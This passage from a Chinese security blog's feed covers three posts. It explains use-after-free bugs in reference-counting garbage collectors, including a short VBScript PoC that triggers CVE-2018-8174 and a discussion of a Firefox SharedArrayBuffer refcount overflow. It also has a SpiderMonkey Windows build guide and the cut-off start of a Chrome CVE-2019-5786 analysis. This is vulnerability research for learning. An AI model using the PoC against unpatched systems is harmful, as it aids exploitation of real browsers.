href="https://www.anquanke.com/post/id/170727" target="_blank" rel="noopener">安全客</a> 和 <a href="https://securelist.com/root-cause-analysis-of-cve-2018-8174/85486/" target="_blank" rel="noopener">卡巴斯基</a> 的分析文章。漏洞的 PoC 代码如下所示：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Dim</span> arr(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">Dim</span> o</span><br><span class="line"></span><br><span class="line"><span class="keyword">Class</span> MyClass</span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Sub</span> <span class="keyword">Class_Terminate</span></span><br><span class="line">        <span class="keyword">Set</span> o = arr(<span class="number">0</span>)</span><br><span class="line">        arr(<span class="number">0</span>) = &amp;h12345678</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> arr(<span class="number">0</span>) = <span class="keyword">new</span> MyClass</span><br><span class="line"><span class="keyword">Erase</span> arr</span><br><span class="line"></span><br><span class="line"><span class="comment">' Trigger UAF</span></span><br><span class="line"><span class="built_in">MsgBox</span> o</span><br></pre></td></tr></table></figure><p>这里在清空数组时，会依次清空数组中的元素。<code>arr(0)</code> 保存了 <code>MyClass</code> 对象的引用，因此最终会触发 <code>MyClass</code> 的析构函数，而在该析构函数中又重新引用了对象本身；由于 VBScript 引擎没有处理好这种情况，这里对象会被回收，后续再次使用对象时便会触发 UAF 。</p><p>这里触发漏洞的模式，和上面提到的 Python 代码非常相似，只是这里 VBScript 引擎并没有考虑到对象在析构函数中被重新引用这一情况。</p><h2 id="0x03-整数溢出问题"><a href="#0x03-整数溢出问题" class="headerlink" title="0x03. 整数溢出问题"></a>0x03. 整数溢出问题</h2><p>大家可能会想，引用计数不会存在整数溢出问题吗？理论上是可以的，但实际上通常不会出现这样的情况！</p><p>引用计数器的类型可以使用 <strong>平台相关</strong> 的整数类型，比如 <code>32</code> 位环境下使用 <code>32</code> 位的计数器，<code>64</code> 位环境下使用 <code>64</code> 位的寄存器。这里以前者为例分析溢出时的情况：</p><p>假如使用无符号类型的引用计数，那么要存在 <code>2^32</code> 个引用才会产生溢出，这里 <code>2^32 = 4GB</code> ；而产生一个引用计数至少要占用一定的内存（比如在脚本语言中定义一个变量），即便是 <code>4</code> 字节就需要占用 <code>16GB</code> 的内存，而实际情况则肯定是 <code>16GB</code> 的数倍。</p><p>在 <code>32</code> 位环境下，在触发整数溢出前，早就触发了 <strong>OOM</strong> （Out-Of-Memory）异常；在 <code>64</code> 位下，同样也会导致 OOM ；此外，实现整数溢出的时间，可能也是难以接受的。</p><p>相关案例可以参考 Firefox 的一个 Issue ：<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1352093" target="_blank" rel="noopener">Use-after-free due to ref counter overflow in CanvasRenderingContext2D</a> 。</p><h2 id="0x04-Firefox-SharedArrayBuffer-UAF"><a href="#0x04-Firefox-SharedArrayBuffer-UAF" class="headerlink" title="0x04. Firefox SharedArrayBuffer UAF"></a>0x04. Firefox SharedArrayBuffer UAF</h2><p>上面提到，<strong>通常情况下</strong> 不存在引用计数溢出的问题，但 <strong>特殊情况下</strong> 这也是需要考虑的一个问题！<a href="https://phoenhex.re/2017-06-21/firefox-structuredclone-refleak" target="_blank" rel="noopener">Share with care: Exploiting a Firefox UAF with shared array buffers</a> 就是一个很好的例子。</p><p>所谓特殊情况，无非就是在可以接受的时间消耗和内存占用的情况下，不断增加对象的引用计数并最终导致其溢出的情况。</p><p>在上述文章中提到，Firefox 的 <code>SharedArrayBuffer</code> 使用了 <code>uint32_t</code> 类型的引用计数器，并且不会检查溢出问题，这就存在整数溢出的可能性。</p><p>此外，在特定的漏洞场景下，利用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Worker" target="_blank" rel="noopener">Web Worker</a> 序列化（使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm" target="_blank" rel="noopener">结构化克隆算法</a> ）<code>SharedArrayBuffer</code> 对象时，可以在不创建新的 <code>SharedArrayBuffer</code> 的情况下（也不需要定义额外的变量）增加原有 <code>SharedArrayBuffer</code> 的引用计数，这就消除了触发整数溢出需要占用大量内存的情况。</p><p>最后，文章使用了一个小技巧来缩短触发漏洞所需要的时间，即通过 <code>postMessage</code> 到自身（不是发送给其他 Web Worker ）来创建指向同一个 <code>SharedArrayBuffer</code> 的许多引用（可以减少序列化时的循环次数），最后通过上面提到的漏洞场景来增加 <code>SharedArrayBuffer</code> 的引用计数，以实现在可控的时间内触发引用计数的整数溢出。</p><p>有了上述条件，就可以通过引用计数的溢出来触发 UAF 漏洞，之后再通过利用 UAF 漏洞来实现代码执行。</p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05. 小结"></a>0x05. 小结</h2><p>以上，就是在学习基于引用计数的 GC 时想到的几个漏洞案例，后续如有找到新的案例再进行补充。</p><p><img src="/uploads/201907/gc.gif" alt="Garbage Collector"></p><p>听说这是 Java 的垃圾回收？哈哈哈</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;垃圾分类&lt;/strong&gt; 是最近非常火爆的一个话题，其经常出现在各种新闻报道中，碰巧的是笔者最近也在研究 &lt;strong&gt;垃圾回收&lt;/strong&gt; ，但此垃圾非彼垃圾，笔者研究的是程序设计语言中的 &lt;strong&gt;Garbage Collection&lt;/strong&gt;（下文简称 &lt;strong&gt;GC&lt;/strong&gt;）。&lt;/p&gt;
&lt;p&gt;关于 GC 的入门读物，这里强烈推荐日本人在 2010 年出版的书籍《&lt;strong&gt;垃圾回收的算法与实现&lt;/strong&gt;》。笔者在阅读该书的部分内容时，刚好想到了几个相关的漏洞，因此写篇文章记录一下。&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Garbage Collection" scheme="http://programlife.net/categories/Vulnerability/Garbage-Collection/"/>
    
    
      <category term="引用计数" scheme="http://programlife.net/tags/%E5%BC%95%E7%94%A8%E8%AE%A1%E6%95%B0/"/>
    
      <category term="垃圾回收" scheme="http://programlife.net/tags/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/"/>
    
      <category term="GC" scheme="http://programlife.net/tags/GC/"/>
    
      <category term="Use-After-Free" scheme="http://programlife.net/tags/Use-After-Free/"/>
    
      <category term="VBScript" scheme="http://programlife.net/tags/VBScript/"/>
    
      <category term="Firefox" scheme="http://programlife.net/tags/Firefox/"/>
    
  </entry>
  
  <entry>
    <title>SpiderMonkey 编译</title>
    <link href="http://programlife.net/2019/05/18/spidermonkey-build/"/>
    <id>http://programlife.net/2019/05/18/spidermonkey-build/</id>
    <published>2019-05-18T00:13:37.000Z</published>
    <updated>2019-07-03T14:52:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Why"><a href="#0x01-Why" class="headerlink" title="0x01. Why"></a>0x01. Why</h2><p>道路千万条，编译第一条！</p><p>在 Windows 上编译开源软件，总是有各种各样的坑等着去填。</p><a id="more"></a><h2 id="0x02-Steps"><a href="#0x02-Steps" class="headerlink" title="0x02. Steps"></a>0x02. Steps</h2><h3 id="2-1-工具"><a href="#2-1-工具" class="headerlink" title="2.1 工具"></a>2.1 工具</h3><ul><li>Git</li><li>Mozilla-Build</li><li>CMake</li><li>Visual Studio 2017</li></ul><h3 id="2-2-步骤"><a href="#2-2-步骤" class="headerlink" title="2.2 步骤"></a>2.2 步骤</h3><p>使用 Git 拉取最新的源代码，如果对历史 commit 不感兴趣，可以选择 <code>--depth 1</code> 来加快拉取速度：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/mozilla/gecko-dev.git</span><br></pre></td></tr></table></figure><p>安装 <a href="https://ftp.mozilla.org/pub/mozilla/libraries/win32/MozillaBuildSetup-3.2.exe" target="_blank" rel="noopener">Mozilla-Build</a> ，这会配置一个基本的 MinGW32 环境；安装完毕之后，打开 Mozilla-Build ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‪C:\mozilla-build\start-shell.bat</span><br></pre></td></tr></table></figure><p>切换到 SpiderMonkey 所在的路径，并执行如下命令（参考 <a href="https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/" target="_blank" rel="noopener">Introduction to SpiderMonkey Exploitation</a> ）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">autoconf-2.13</span><br><span class="line">mkdir build.asserts</span><br><span class="line"><span class="built_in">cd</span> build.asserts</span><br><span class="line">../configure --host=x86_64-pc-mingw32 --target=x86_64-pc-mingw32 --<span class="built_in">enable</span>-debug</span><br></pre></td></tr></table></figure><p>提示找不到 C 编译器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">checking for the target C compiler... not found</span><br><span class="line">DEBUG: _cc: Trying clang-cl</span><br><span class="line">DEBUG: _cc: Trying gcc</span><br><span class="line">DEBUG: _cc: Trying clang</span><br><span class="line">ERROR: Cannot find the target C compiler</span><br></pre></td></tr></table></figure><p>此时，不要急着去下载安装 LLVM ，因为官方预编译版本都是没有 <code>llvm-config</code> 组件的，照样无法编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">checking for llvm-config... c:/Users/User\.mozbuild\clang\bin\llvm-config</span><br><span class="line">not found</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;../../../configure.py&quot;, line 132, in &lt;module&gt;</span><br><span class="line">    sys.exit(main(sys.argv))</span><br><span class="line">  File &quot;../../../configure.py&quot;, line 38, in main</span><br><span class="line">    sandbox.run(os.path.join(os.path.dirname(__file__), &apos;moz.configure&apos;))</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 481, in run</span><br><span class="line">    func(*args)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 525, in _value_for</span><br><span class="line">    return self._value_for_depends(obj)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\util.py&quot;, line 947, in method_call</span><br><span class="line">    cache[args] = self.func(instance, *args)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 534, in _value_for_depends</span><br><span class="line">    value = obj.result()</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\util.py&quot;, line 947, in method_call</span><br><span class="line">    cache[args] = self.func(instance, *args)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 151, in result</span><br><span class="line">    return self._func(*resolved_args)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/bindgen.configure&quot;, line 322, in basic_bindgen_cflags</span><br><span class="line">    info = check_compiler([clang_path], &apos;C++&apos;, target)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/toolchain.configure&quot;, line 508, in check_compiler</span><br><span class="line">    info = get_compiler_info(compiler, language)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/toolchain.configure&quot;, line 455, in get_compiler_info</span><br><span class="line">    result = try_preprocess(compiler, language, check)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/toolchain.configure&quot;, line 371, in try_preprocess</span><br><span class="line">    return try_invoke_compiler(compiler, language, source, [&apos;-E&apos;])</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/util.configure&quot;, line 246, in try_invoke_compiler</span><br><span class="line">    return check_cmd_output(*cmd, **kwargs)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/util.configure&quot;, line 69, in check_cmd_output</span><br><span class="line">    retcode, stdout, stderr = get_cmd_output(*args, **kwargs)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/util.configure&quot;, line 46, in get_cmd_output</span><br><span class="line">    log.debug(&apos;Executing: `%s`&apos;, quote(*args))</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\shellutil.py&quot;, line 206, in quote</span><br><span class="line">    return &apos; &apos;.join(_quote(s) for s in strings)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\shellutil.py&quot;, line 206, in &lt;genexpr&gt;</span><br><span class="line">    return &apos; &apos;.join(_quote(s) for s in strings)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\shellutil.py&quot;, line 194, in _quote</span><br><span class="line">    return t(&quot;&apos;%s&apos;&quot;) % s.replace(t(&quot;&apos;&quot;), t(&quot;&apos;\\&apos;&apos;&quot;))</span><br><span class="line">TypeError: cannot create &apos;NoneType&apos; instances</span><br></pre></td></tr></table></figure><p>没办法，只能自己编译一个 LLVM （参考 <a href="https://clang.llvm.org/get_started.html" target="_blank" rel="noopener">Building and Running Clang</a> ，记得先安装 CMake ）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone --depth 1 https://github.com/llvm/llvm-project.git</span><br><span class="line">cd llvm-project</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DLLVM_ENABLE_PROJECTS=clang -G "Visual Studio 15 2017" -A x64 -Thost=x64 ../llvm</span><br></pre></td></tr></table></figure><p>然后用 Visual Studio 2017 打开 <code>LLVM.sln</code> 编译 Release 版本。</p><blockquote><p>Build the “clang” project for just the compiler driver and front end, or the “ALL_BUILD” project to build everything, including tools.</p></blockquote><p>现在，可以回到编译 SpiderMonkey 的步骤了，开始下一步之前，先把 LLVM 的路径添加到 <code>PATH</code> 环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export LLVMDIR=/D/llvm-project/build/Release</span><br><span class="line">export PATH=$PATH:$LLVMDIR/bin</span><br></pre></td></tr></table></figure><p>继续配置编译 SpiderMonkey 相关的参数：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --host=x86_64-pc-mingw32 --target=x86_64-pc-mingw32 --<span class="built_in">enable</span>-debug</span><br></pre></td></tr></table></figure><p>提示找不到链接器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">checking <span class="keyword">for</span> mt... C:/PROGRA~2/WI3CF2~1/10/bin/100177~1.0/x64/mt.exe</span><br><span class="line">checking whether MT is really Microsoft Manifest Tool... yes</span><br><span class="line">checking <span class="keyword">for</span> linker... not found</span><br><span class="line">DEBUG: linker: Trying lld-link</span><br><span class="line">ERROR: Cannot find linker</span><br></pre></td></tr></table></figure><p>通过设置 <code>LINKER</code> 环境变量解决：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LINKER=<span class="string">"/C/Program Files (x86)/Microsoft Visual Studio/2017/Professional/VC/Tools/MSVC/14.15.26726/bin/Hostx64/x64/link.exe"</span></span><br></pre></td></tr></table></figure><p>继续运行 <code>configure</code> ，会提示找不到 <code>host_linker</code> ：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">checking <span class="keyword">for</span> linker... c:/PROGRA~2/MICROS~3/2017/PROFES~1/VC/Tools/MSVC/1415~1.267/bin/Hostx64/x64/link.exe</span><br><span class="line">checking <span class="keyword">for</span> host_linker... not found</span><br><span class="line">DEBUG: host_linker: Trying lld-link</span><br><span class="line">ERROR: Cannot find host_linker</span><br></pre></td></tr></table></figure><p>通过设置 <code>HOST_LINKER</code> 环境变量解决：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HOST_LINKER=<span class="variable">$LINKER</span></span><br></pre></td></tr></table></figure><p>一切正常，终于可以开始编译了（为了加快编译速度，可以指定 <code>-j</code> 参数）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mozmake -j4</span><br></pre></td></tr></table></figure><h2 id="0x03-JavaScript-Shell"><a href="#0x03-JavaScript-Shell" class="headerlink" title="0x03. JavaScript Shell"></a>0x03. JavaScript Shell</h2><p>等 SpiderMonkey 编译完之后，在路径 <code>build.asserts\dist\bin</code> 下可以找到相关的二进制文件，其中 JavaScript Shell 为 <code>js.exe</code> 。</p><p>如果不想折腾编译，也可以直接从 <a href="https://archive.mozilla.org/pub/firefox/nightly/latest-mozilla-central/" target="_blank" rel="noopener">Firefox Nightly Builds</a> 直接下载已经编译好的 JavaScript Shell （这是 Release 版本，功能比 Debug 版本少一些）。</p><h3 id="3-1-SpiderMonkey"><a href="#3-1-SpiderMonkey" class="headerlink" title="3.1 SpiderMonkey"></a>3.1 SpiderMonkey</h3><p><code>js.exe</code> 支持参数启动，具体可以参考 <code>js.exe --help</code> 。</p><p><a href="https://programlife.net/tags/JavaScript/">JavaScript</a> Shell 提供了许多的内置函数可供调用，具体可以参考 <code>help()</code> 的执行结果（ Debug 版本比 Release 提供了更多的内置函数）；几个比较常用的函数：</p><ol><li>objectAddress ，打印 JavaScript 对象的内存地址</li><li>dumpObject ，打印 JavaScript 对象的结构</li><li>dis ，打印函数的字节码</li><li>quit ，退出 JavaScript Shell</li></ol><p><img src="/uploads/201905/spidermonkey-javascript-shell.png" alt="SpiderMonkey JavaScript Shell"></p><h3 id="3-2-IonMonkey"><a href="#3-2-IonMonkey" class="headerlink" title="3.2 IonMonkey"></a>3.2 IonMonkey</h3><p><a href="https://programlife.net/tags/SpiderMonkey/">SpiderMonkey</a> 的 JavaScript Shell 同时支持设置其 JIT 编译引擎 <a href="https://programlife.net/tags/IonMonkey/">IonMonkey</a> 的相关参数，可以将环境变量 <code>IONFLAGS</code> 设置为 <code>help</code> 来查看详细的帮助信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">set IONFLAGS=help</span><br><span class="line"></span><br><span class="line">js.exe</span><br><span class="line">found tag: help</span><br><span class="line"></span><br><span class="line">usage: IONFLAGS=option,option,option,... where options can be:</span><br><span class="line"></span><br><span class="line">  aborts        Compilation abort messages</span><br><span class="line">  scripts       Compiled scripts</span><br><span class="line">  mir           MIR information</span><br><span class="line">  prune         Prune unused branches</span><br><span class="line">  escape        Escape analysis</span><br><span class="line">  alias         Alias analysis</span><br><span class="line">  alias-sum     Alias analysis: shows summaries for every block</span><br><span class="line">  gvn           Global Value Numbering</span><br><span class="line">  licm          Loop invariant code motion</span><br><span class="line">  flac          Fold linear arithmetic constants</span><br><span class="line">  eaa           Effective address analysis</span><br><span class="line">  sincos        Replace sin/cos by sincos</span><br><span class="line">  sink          Sink transformation</span><br><span class="line">  regalloc      Register allocation</span><br><span class="line">  inline        Inlining</span><br><span class="line">  snapshots     Snapshot information</span><br><span class="line">  codegen       Native code generation</span><br><span class="line">  bailouts      Bailouts</span><br><span class="line">  caches        Inline caches</span><br><span class="line">  osi           Invalidation</span><br><span class="line">  safepoints    Safepoints</span><br><span class="line">  pools         Literal Pools (ARM only for now)</span><br><span class="line">  cacheflush    Instruction Cache flushes (ARM only for now)</span><br><span class="line">  range         Range Analysis</span><br><span class="line">  logs          JSON visualization logging</span><br><span class="line">  logs-sync     Same as logs, but flushes between each pass (sync. compiled functions only).</span><br><span class="line">  profiling     Profiling-related information</span><br><span class="line">  trackopts     Optimization tracking information gathered by the Gecko profiler. (Note: call enableGeckoProfiling() in your script to enable it).</span><br><span class="line">  trackopts-ext Encoding information about optimization tracking</span><br><span class="line">  dump-mir-expr Dump the MIR expressions</span><br><span class="line">  cfg           Control flow graph generation</span><br><span class="line">  all           Everything</span><br><span class="line"></span><br><span class="line">  bl-aborts     Baseline compiler abort messages</span><br><span class="line">  bl-scripts    Baseline script-compilation</span><br><span class="line">  bl-op         Baseline compiler detailed op-specific messages</span><br><span class="line">  bl-ic         Baseline inline-cache messages</span><br><span class="line">  bl-ic-fb      Baseline IC fallback stub messages</span><br><span class="line">  bl-osr        Baseline IC OSR messages</span><br><span class="line">  bl-bails      Baseline bailouts</span><br><span class="line">  bl-dbg-osr    Baseline debug mode on stack recompile messages</span><br><span class="line">  bl-all        All baseline spew</span><br><span class="line"></span><br><span class="line">See also SPEW=help for information on the Structured Spewer.</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-Why&quot;&gt;&lt;a href=&quot;#0x01-Why&quot; class=&quot;headerlink&quot; title=&quot;0x01. Why&quot;&gt;&lt;/a&gt;0x01. Why&lt;/h2&gt;&lt;p&gt;道路千万条，编译第一条！&lt;/p&gt;
&lt;p&gt;在 Windows 上编译开源软件，总是有各种各样的坑等着去填。&lt;/p&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="http://programlife.net/categories/JavaScript/"/>
    
      <category term="SpiderMonkey" scheme="http://programlife.net/categories/JavaScript/SpiderMonkey/"/>
    
    
      <category term="Firefox" scheme="http://programlife.net/tags/Firefox/"/>
    
      <category term="JavaScript" scheme="http://programlife.net/tags/JavaScript/"/>
    
      <category term="SpiderMonkey" scheme="http://programlife.net/tags/SpiderMonkey/"/>
    
      <category term="IonMonkey" scheme="http://programlife.net/tags/IonMonkey/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-5786 Chrome FileReader UAF 漏洞分析</title>
    <link href="http://programlife.net/2019/03/25/cve-2019-5786-chrome-filereader-use-after-free-vulnerability-analysis/"/>
    <id>http://programlife.net/2019/03/25/cve-2019-5786-chrome-filereader-use-after-free-vulnerability-analysis/</id>
    <published>2019-03-25T10:00:00.000Z</published>
    <updated>2019-03-26T13:54:09.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01. 漏洞简介"></a>0x01. 漏洞简介</h2><p>准备用业余时间学习一点浏览器漏洞利用相关的知识，刚好最近 Chrome 爆出来一个野外利用漏洞 CVE-2019-5786 ，而且网上也有两篇比较详细的分析报告（来自 <a href="https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/" target="_blank" rel="noopener">Exodus Intelligence</a> 和 <a href="https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/analysis-of-a-chrome-zero-day-cve-2019-5786/" target="_blank" rel="noopener">McAfee Labs</a>），刚好可以借鉴学习一下漏洞的原理以及利用技巧。</p><p>Chrome 72.0.3626.121 的 <a href="https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop.html" target="_blank" rel="noopener">安全公告</a> 显示，漏洞 CVE-2019-5786 由 Google Threat Analysis Group 的 Clement Lecigne 发现其被利用于野外攻击（配合 Windows 内核空指针漏洞 CVE-2019-0808 可实现 Windows 7 下的提权操作）。</p><a id="more"></a><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02. 漏洞分析"></a>0x02. 漏洞分析</h2><h3 id="2-1-FileReader"><a href="#2-1-FileReader" class="headerlink" title="2.1 FileReader"></a>2.1 FileReader</h3><p>Chrome 的安全公告指明该 UAF 漏洞位于 <a href="https://developer.mozilla.org/en-US/docs/Web/API/FileReader" target="_blank" rel="noopener">FileReader</a> 中，因此在进行具体的漏洞分析工作之前，有必要简单了解一下 FileReader 对象的用法。FileReader 可以实现对文件内容（<strong>File</strong>）或者缓冲区数据（<strong>Blob</strong>）的异步读取，其中几个重要的属性或者回调函数如下所示。</p><ul><li><code>readyState</code> 表示读取状态<ul><li>EMPTY，0，尚未读取任何数据</li><li>LOADING，1，正在读取数据</li><li>DONE，2，数据读取完成</li></ul></li><li><code>result</code> 表示读取结果，具体的格式与数据的读取方式有关<ul><li>readAsArrayBuffer</li><li>readAsBinaryString</li><li>readAsDataURL</li><li>readAsText</li></ul></li><li><code>onprogress</code> 回调函数<ul><li>读取 <strong>Blob</strong> 时触发</li><li>当数据比较多时可能会周期性触发多次</li></ul></li><li><code>onloadend</code> 回调函数<ul><li>读取操作完成时触发，不管最终读取成功还是失败</li></ul></li></ul><p>下面是 FileReader 的一段简单示例代码（读取长度为 100MB 的字符串到 ArrayBuffer 中）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var size = 100 * 1024 * 1024;</span></span><br><span class="line"><span class="undefined">var string = 'A'.repeat(size);</span></span><br><span class="line"><span class="undefined">var blob = new Blob([string]);</span></span><br><span class="line"><span class="undefined">var reader = new FileReader();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span 